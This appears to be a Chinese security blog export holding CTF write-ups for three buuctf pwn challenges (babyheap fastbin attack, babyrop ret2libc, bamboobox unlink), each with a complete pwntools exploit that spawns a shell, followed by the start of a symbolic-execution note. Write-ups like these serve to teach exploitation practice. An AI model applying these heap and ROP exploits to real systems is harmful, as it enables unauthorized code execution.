给sdu的新生赛搞宣传（本来想出点签到题结果已经被人出好了TT^TT）<br />
给SecretFlow审了一点go语言的洞<br />
然后用C#和xaml给sdu校园网写了个一键修复脚本<br />
总而言之学的很杂...说实话真不如多打点比赛。<br />
本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了...<br />
总而言之还是脚踏实地学一点算一点吧<br />
还有个南大PA的坑等着我去填呢...才刚把nemu的gdb实现了个单步步入...</p>
<blockquote>
<p>做完这道题才算真正意义上的AK第一页XD</p>
</blockquote>
<h2 id="主要知识点">Ⅰ. 主要知识点</h2>
<ol type="1">
<li>堆溢出</li>
</ol>
<h2 id="解题步骤">Ⅱ. 解题步骤</h2>
<ol type="1">
<li>checksec 保护全开</li>
</ol>
<p><img src="/pic/Pasted%20image%2020230814133847.png" /></p>
<ol start="2" type="1">
<li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下<br />
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure></p></li>
<li><p>拖进IDA64分析，让反汇编以后的代码好看一点<br />
<img src="/pic/Pasted%20image%2020230814134313.png" /> <img
src="/pic/Pasted%20image%2020230814134623.png" />
注：IDA中快捷键y可以修改变量类型，上图Alloc函数的我将a1的变量类型<code>_int64</code>修改为<code>_int64*</code></p></li>
<li><p>IDA分析可知，我们可以有以下思路：</p>
<ol type="1">
<li>Fill函数的输入字符数量是受我们控制的，所以可以堆溢出；</li>
<li>由于本题并没有给出system等可以直接提权的函数，所以考虑泄露libc地址
<ol type="1">
<li>要泄露libc地址，肯定要读存有libc地址的地址
<ol type="1">
<li>哪里存着libc地址？unsorted
bin仅有一个chunk时，此chunk的fd和bk都指向<code>地址main_arena+58</code>，而main_arena是libc的data段中的一个全局静态变量，所以泄露它就可以知道libc_base（注：此处存放的是topchunk的地址）</li>
<li>怎么去读unsorted bin的fd/bk指针？堆溢出+多次free/alloc</li>
</ol></li>
</ol></li>
<li>有了libc地址，我们可以通过修改fastbin的fd指针，在程序的__malloc_hook处(用libc+偏移来计算)申请一个我们可以操控的堆块，并在其中写入og的地址来提权</li>
</ol></li>
<li><p>大概思路我们有了，接下来是写exp+调试验证思路。我们为了能够将chunk放入unsorted
bin，肯定需要一个small chunk；要fastbin attack，肯定需要两个fastbin
chunk；为了方便控制这三个chunk，我们再设置两个fastbin chunk，即：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index = 4</span></span><br></pre></td></tr></table></figure> 此时堆的情况如下 <img
src="/pic/Pasted%20image%2020230814140742.png" /></p></li>
<li><p>Free掉index为1和2的chunk，给后面alloc留出空间 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
heap情况如下 <img src="/pic/Pasted%20image%2020230814141436.png" />
bin情况如下 <img
src="/pic/Pasted%20image%2020230814141724.png" /></p></li>
<li><p>堆溢出，操控fastbin</p>
<ol type="1">
<li>现在是main_arena_fastbin_0x20 ---&gt; chunk2 ---&gt;chunk1</li>
<li>我们想办法让它变成 xxx_0x20 ---&gt; chunk2 ---&gt;chunk4
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = (p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>))*<span class="number">2</span> + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>
（这里读者可以自己gdb.attach用bin命令去查看fastbin前后的状态）</li>
</ol></li>
<li><p>由于从fastbin申请chunk时会检查fastbin中chunk的size，如果不匹配则报错，所以我们要通过堆溢出修改chunk4的size，让其从0x91变为0x21
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br></pre></td></tr></table></figure></p></li>
<li><p>申请两个大小为0x10的chunk，可以看到<code>原chunk1</code>指向了<code>原chunk2的地址</code>，<code>原chunk2</code>指向了<code>原chunk4的地址</code>，这样我们就有两个指针指向chunk4了，可以用一个指针来释放，一个指针来读取，方便阅读我们分别命名为pointer_chunk4和pointer_chunk2
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure> heap情况如下 <img
src="/pic/Pasted%20image%2020230814143302.png" /></p></li>
<li><p>直接用pointer_chunk4释放chunk4，ptmalloc会因为找不到topchunk而报错。所以我们应该恢复chunk4的size到0x91再free，但这样会导致chunk4直接跟topchunk合并。所以我们要先恢复chunk4的size到0x91再申请一个0x80大小的堆块隔离topchunk再free
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>此时chunk4的fd和bk就已经存放着一个地址了，我们通过pointer_chunk2来把他读出来。这个地址是main_arena+88，打开libc可以看到main_arena的地址为0x3c4b20，所以我们获得的libc_addr需要减88再减0x3c4b20，即减去0x3C4B78
<img src="/pic/Pasted%20image%2020230814144704.png" />
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">16</span>)[-<span class="number">8</span>:])-<span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base   ---&gt;   &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure></p></li>
<li><p>我们现在有了libc的地址，下一步是劫持malloc_hook。由于我们要通过fastbin来在malloc_hook处申请堆块，所以我们要通过fastbin对于size的检验，所以看一下malloc_hook前面有没有我们能够申请堆块的地方
<img src="/pic/Pasted%20image%2020230814145721.png" />
发现aed处的0x0000007f符合fastbin的空间，所以我们用libc_base+0x3c4aed(这个用当前地址减去基地址即可算出)来申请<br />
⚠这里图aed写错了，而且不应该看这个界面，整体上的chunk应该是
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aed  0x----------------(prev_size) 0x000000000000007f(size)</span><br><span class="line">afd  ---------------------user_data-----------------------</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># 将unsortedbin中的chunk4切0x60大小申请出来</span></span><br><span class="line">free(<span class="number">4</span>)                                        <span class="comment"># 把chunk4放到fastbin中，便于用pointer_chunk2操控</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)              <span class="comment"># 把申请块写进malloc_hook前面</span></span><br><span class="line">fill(<span class="number">2</span>,payload)                                <span class="comment"># 这一步后，fastbin: main_arena ---&gt; chunk4 ---&gt; _ + 0x3c4aed</span></span><br><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># 把chunk4申请回来</span></span><br><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># 在malloc_hook处构造堆，index=6</span></span><br></pre></td></tr></table></figure>
<ol start="13" type="1">
<li><p>我们修改chunk6的内容，即修改malloc_hook，我们用og来提权
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br></pre></td></tr></table></figure></p></li>
<li><p>若malloc_hook不为空，再申请堆时会先调用malloc_hook处的函数，所以随便申请即可cat
flag <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">255</span>)</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h3 id="完整exp">Ⅲ. 完整EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">domain_name = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25970</span></span><br><span class="line">file = <span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.recvline()</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">payload = (p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>))*<span class="number">2</span> + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">16</span>)[-<span class="number">8</span>:])-<span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base   ---&gt;   &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">255</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="一些疑问">Ⅳ. 一些疑问</h2>
<ol type="1">
<li><p>__malloc_hook不是在data段中吗？这题开了FULL
RELRO为什么可以改啊🤔</p></li>
<li><p>第九步中heap中chunk2的Addr为什么还是40而不是80啊？</p></li>
<li><p>第十步为什么chunk4会跟topchunk合并？是哪个bin的机制？</p>
<ol type="1">
<li>unsortedbin，后向合并</li>
</ol></li>
<li><p><strong><em>为什么非要在aed处申请堆块？</em></strong></p>
<ol type="1">
<li>fastbin指针指向0xaed，说明0xaed-8是size，0xaed-0x10是prev_size，正好伪装chunk</li>
</ol></li>
</ol>
<h1 id="x02-buuctf-ogeek2019babyrop_wp">0x02 buuctf
[OGeek2019]babyrop_wp</h1>
<blockquote>
<p>网上很多wp已经不适用了，所以来更新一波XD</p>
</blockquote>
<h2 id="x00-知识点">0x00 知识点</h2>
<ol type="1">
<li>ret2libc</li>
<li>提供libc的打法</li>
<li>绕过strlen &amp; strncmp函数</li>
</ol>
<h2 id="x01-解题步骤">0x01 解题步骤</h2>
<blockquote>
<p>不贴图了，按伪代码顺序来</p>
</blockquote>
<ol type="1">
<li>fd是urandom库生成的随机数</li>
<li>将fd读4位进buf</li>
<li>将buf作为参数传进函数A，在A中称作a1</li>
<li>将a1读进s</li>
<li><strong>用户输入buf</strong>，但限制读入长度0x20，无法溢出；但可以考虑泄露</li>
<li>v1赋值为buf的长度，绕过strlen &amp; strncmp函数可以用'\x00'</li>
<li>返回buf[7]，传入函数B，在B中称作a1，是read的检测长度，如果足够长可以构造溢出
于是函数A中的read我们有思路了，即 1. 绕过strlen 2. 返回buf[7]越大越好
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line"></span><br><span class="line">io.sendline(payload)                              # Q1：为什么非得是sendline而不能是send？</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br></pre></td></tr></table></figure></li>
<li>B中观察栈的结构可知，我们可以用0xE7+4的垃圾数据抵达返回地址</li>
<li>由于string中并没有找到system('/bin/sh')，而题目提供了libc，所以我们可以泄露libc基地址；由于函数B结束后程序即将结束，我们已经没有溢出的点了，所以考虑将main作为返回地址，再来提供一次溢出，所以考虑构造payload2：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxxxxx</span><br><span class="line">xxxxxx&lt;-----垃圾数据</span><br><span class="line">puts_plt&lt;---调用puts</span><br><span class="line">main_addr&lt;--将puts的返回地址压栈，即将eip的下一条指令压栈</span><br><span class="line">puts_got&lt;---将puts的参数弹给puts</span><br><span class="line"></span><br><span class="line">junk     =  0xE7 + 4</span><br><span class="line"></span><br><span class="line"># payload  =  b&#x27;a&#x27;*junk + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)</span><br><span class="line"></span><br><span class="line">payload  =  b&#x27;a&#x27;*junk + p32(puts_plt) + p32(main_addr) + p32(puts_got)      # Q2: puts为什么不会打印后面的内容了？为什么puts_got后面一定是可以被转换为0a的00？</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr =  u32(io.recv(4))</span><br><span class="line"></span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"></span><br><span class="line"># 注1：puts(const char* arg1)一直打印，直到遇到&#x27;\0&#x27;，丢弃&#x27;\0&#x27;并输出&#x27;\n&#x27;</span><br><span class="line"># 注2：sszie_t write(fd,const char* src,length) (fd=1,length=32/8 or 64/8)</span><br></pre></td></tr></table></figure></li>
<li>泄露libc地址后，泄露<code>system</code>和<code>/bin/sh</code>的地址
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">offset   = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">sys_addr = offset + libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">bin_sh   = offset + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br></pre></td></tr></table></figure></li>
<li>再进行一次绕过strncmp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br></pre></td></tr></table></figure></li>
<li>最后提权 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  =  b&#x27;a&#x27;* junk + p32(sys_addr) + p32(0) + p32(bin_sh)    # 细节2：覆盖返回地址时，32位需要在栈上补充返回地址</span><br><span class="line">                                                                 # Q3：为什么？</span><br><span class="line">io.send(payload)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
<li>最后贴一下全部exp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,26218)</span><br><span class="line"># context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">  </span><br><span class="line">puts_got =elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt =elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_addr = 0x08048825</span><br><span class="line">  </span><br><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br><span class="line">  </span><br><span class="line">junk     =  0xE7 + 4</span><br><span class="line">payload  =  b&#x27;a&#x27;*junk + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">puts_addr =  u32(io.recv(4))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line">  </span><br><span class="line">offset   = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">sys_addr = offset + libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh   = offset + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br><span class="line">  </span><br><span class="line">payload  =  b&#x27;a&#x27;* junk + p32(sys_addr) + p32(0) + p32(bin_sh)</span><br><span class="line">io.send(payload)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="x02-一些思考">0x02 一些思考</h2>
<ol type="1">
<li>本题还可以有以下几种打法
<ol type="1">
<li>泄露地址方面：不仅可以用puts，还可以用write；讲道理一切能输出到终端的函数都可以利用来泄露内容，后续慢慢探索</li>
<li>泄露地址后，我们可以用og进行提权</li>
</ol></li>
<li>一些工具的使用
<ol type="1">
<li>flat可以用来构造payload</li>
</ol></li>
</ol>
<h2 id="x03-一些问题">0x03 一些问题</h2>
<ol type="1">
<li>0x01
中第七步payload，为什么在send时只能是sendline，我看received的结果明明都一样啊</li>
<li>0x01
中第九步payload，puts为什么不会打印后面的内容了（代码底部'注2'）？为什么puts_got后面一定是可以被转换为0a的00？</li>
<li>0x01 中第12步payload，为什么需要sys_addr + 0 +
bin_sh，这个0是sys_addr的返回地址吗？</li>
<li>网上很多博客都用LibcSearcher，可是我在将LibcSearcher数据库更新到最新版本以后还是无法查到对应libc库，很奇怪</li>
</ol>
<h1 id="x03-buuctf-hitcontraining_bamboobox">0x03 buuctf
hitcontraining_bamboobox</h1>
<h2 id="poc">POC</h2>
<p>这题看反汇编代码有个 magic，应该用 House of Force，但是 buu 喜欢把
flag 放在 / 目录下，所以题目提供的 magic 函数就失效了</p>
<p>所以用 unlink 修改堆表，使我们可以实现任意地址写</p>
<h2 id="exp">exp</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;node5.buuoj.cn:28090&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./bamboobox&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def show():</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def alloc(size, content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;item name:&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;name of item:&#x27;, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def edit(idx, size, content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index of item:&#x27;, str(idx))</span><br><span class="line">  io.sendlineafter(&#x27;length of item name:&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;name of the item:&#x27;, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(4))</span><br><span class="line">  io.sendlineafter(&#x27;index of item:&#x27;, str(idx))</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0x40,&#x27;a&#x27;*8 )         # 0</span><br><span class="line">alloc(0x80,&#x27;b&#x27; * 8)        # 1</span><br><span class="line">alloc(0x80,&#x27;c&#x27; * 8)        # 2</span><br><span class="line">alloc(0x20,&#x27;/bin/sh\x00\x00\x00\x00&#x27;)  # 3</span><br><span class="line"></span><br><span class="line">ptr=0x6020c8</span><br><span class="line">fd=ptr-0x18</span><br><span class="line">bk=ptr-0x10</span><br><span class="line"></span><br><span class="line">fake_chunk=p64(0)</span><br><span class="line">fake_chunk+=p64(0x41)</span><br><span class="line">fake_chunk+=p64(fd)</span><br><span class="line">fake_chunk+=p64(bk)</span><br><span class="line">fake_chunk+=b&#x27;\x00&#x27;*0x20</span><br><span class="line">fake_chunk+=p64(0x40)</span><br><span class="line">fake_chunk+=p64(0x90)</span><br><span class="line"></span><br><span class="line">edit(0,len(fake_chunk),fake_chunk)</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">free_got=elf.got[&#x27;free&#x27;]</span><br><span class="line">payload1=p64(0)+p64(0)+p64(0x30)+p64(free_got)</span><br><span class="line"></span><br><span class="line">edit(0,len(payload1),payload1)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">free_addr=u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8,b&#x27;\x00&#x27;)) </span><br><span class="line">libc=LibcSearcher(&#x27;free&#x27;,free_addr)</span><br><span class="line">libc_base=free_addr-libc.dump(&#x27;free&#x27;)</span><br><span class="line">sys_addr=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;free_addr   ---&gt;   &#x27;,hex(free_addr))</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr   ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">edit(0,0x8,p64(sys_addr))</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF_practice</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Symbolic Execution Leaning Note (1) -- Basis</title>
    <url>/2023/09/30/Symbolic%20Execution%20Leaning%20Note%20(1)%20--%20Basis/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
迈向自动化的第一步——
</blockquote>
<span id="more"></span>
<h1 id="x00-基本模型">0x00 基本模型</h1>
<ul>
<li><p><strong>概述</strong><br />
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="type">void</span> <span class="title function_">sum</span><span class="params">(a,b)</span>&#123;</span><br><span class="line"><span class="number">2</span>    <span class="type">int</span> x = a;</span><br><span class="line"><span class="number">3</span>    <span class="type">int</span> y = b;</span><br><span class="line"><span class="number">4</span>    <span class="type">int</span> z = x + y;</span><br><span class="line"><span class="number">5</span>    <span class="keyword">return</span> z;</span><br><span class="line"><span class="number">6</span>  &#125;</span><br></pre></td></tr></table></figure> 调用<span
class="math inline">\(sum(1,2)\)</span>，学过C语言的都知道会发生什么事情<br />
但如果我调用<span
class="math inline">\(sum(a1,a2)\)</span>，并且我在这之前并未声明a1，a2呢？<br />
先不要用C语言的思路来考虑了，我们称这种情况为<strong>符号执行(Symbolic
Execution)</strong>，具体会发生什么我们接着往下看</p></li>
<li><p><strong>基本思想</strong></p>
<ol type="1">
<li>使用符号变量代替具体值作为程序或函数的参数，并模拟执行程序中的指令，各指令的操作都基于符号变量进行，其中操作数的值由符号和常量组成的表达式来表示
<ol type="1">
<li>符号变量是什么？
<ol type="1">
<li>读者可以将符号执行视为程序具体执行的自然扩展，符号变量使得程序执行变得不确定，当我们给一系列符号赋一个确定的值时，符号执行就成为了程序具体执行（i.e.
程序的一次具体执行可以视为符号执行的一次实例）</li>
</ol></li>
<li>操作数是什么？</li>
</ol></li>
<li>对于任意程序，其执行流程是由执行序列的执行语义控制的
<ol type="1">
<li>执行语义：
<ol type="1">
<li>变量定义语句对数据对象的描述 <code>int a;</code></li>
<li>声明语句对程序数据对象的修改 <code>a = 10;</code></li>
<li>条件语句对程序执行流程的控制</li>
</ol></li>
</ol></li>
<li>当程序的输入参数确定时，其指令序列被固定，因此程序执行语义和控制流也被固定</li>
</ol></li>
<li><p><strong>程序语言定义</strong></p>
<ol type="1">
<li>James C. King在提出符号执行技术的同时，也为其限定了理想的适用场景：
<ol type="1">
<li>理想模型中程序只处理“有符号整数”</li>
<li>程序“执行数”规模有限</li>
<li>可以处理程序内所有if条件语句的约束表达式</li>
</ol></li>
<li>基于符号执行技术的理想场景，对程序语言做如下定义
<ol type="1">
<li>程序变量类型：只包含“有符号整数”</li>
<li>程序语句类型
<ol type="1">
<li>简单声明语句，如<code>a = 3</code></li>
<li>if条件语句(包括then 和 else)</li>
<li>无条件跳转语句，如goto语句</li>
<li>变量操作语句：如read函数、基本整数运算操作（+、-、*）</li>
</ol></li>
<li>程序语义
<ol type="1">
